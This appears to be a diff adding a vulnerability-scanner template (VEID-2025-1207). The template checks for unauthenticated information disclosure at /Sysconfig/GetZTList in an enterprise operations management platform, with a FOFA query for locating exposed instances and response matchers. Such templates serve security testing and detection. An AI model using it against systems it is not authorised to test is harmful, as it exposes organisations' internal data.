@@ -1,0 +1,21 @@
+## id: VEID-2025-1207
+## name: 友加畅捷管理系统GetZTList存在信息泄露
+## author: hack007x
+## severity: low
+## tags: veid,info,veid2025
+## description: 该漏洞出现在/Sysconfig/GetZTList 未授权查看信息泄露
+## fofa-query: product="友加畅捷-企业实时运营管理平台"
+## verification: true
+
+
+GET /Sysconfig/GetZTList HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "json"
+#@ matcher: body matches /"ID"\s*:\s*"[^"]+"/
+
+
+
